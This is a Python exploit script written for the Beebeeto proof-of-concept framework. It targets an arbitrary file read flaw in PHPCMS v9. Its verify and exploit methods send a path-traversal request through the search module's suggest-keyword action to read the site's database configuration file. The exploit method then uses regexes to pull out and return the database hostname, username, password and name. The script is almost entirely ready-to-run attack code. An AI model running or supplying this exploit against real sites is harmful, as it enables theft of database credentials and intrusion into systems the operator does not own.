#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0118',
            'name': 'PHPCMS v9 /index.php 任意文件读取漏洞 POC & Exploit',
            'author': 'flsf',
            'create_date': '2014-10-27',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPCMS',
            'vul_version': ['V9'],
            'type': 'Arbitrary File Read',
            'tag': ['PHPCMS漏洞', '/index.php', 'Arbitraty File Download', '任意文件读取漏洞', 'php'],
            'desc': '''
                    the file phpcms\modules\search\index.php is affected of this vulnerability, parameter $url been used directly without any validation,
                    so attackers can do some trick to read the source of local files.
                    ''',
            'references': ['http://sebug.net/vuldb/ssvid-60295',
                           ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + ("/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q="
                                                  "../../phpsso_server/caches/configs/database.php")
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        if ('hostname' in content) and ('username' in content):
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args


    @classmethod
    def exploit(cls, args):
        payload = "/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php"
        verify_url = args['options']['target'] + payload
        REGX_DICT = {
            'hostname':r"""'hostname'\s=>\s'(.*)'""",
            'database':r"""'database'\s=>\s'(.*)'""",
            'username':r"""'username'\s=>\s'(.*)'""",
            'password':r"""'password'\s=>\s'(.*)'"""
        }
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        request = urllib2.Request(verify_url)
        response = urllib2.urlopen(request)
        content = response.read()
        db_info = {}
        for regx in REGX_DICT:
            match = re.search(REGX_DICT[regx], content)
            if match:
                db_info[regx] = match.group(1).strip('\r')
        if match:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['Hostname'] = db_info['hostname']
            args['poc_ret']['Username'] = db_info['username']
            args['poc_ret']['Password'] = db_info['password']
            args['poc_ret']['DBname']   = db_info['database']
        return args

if __name__ == "__main__":
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())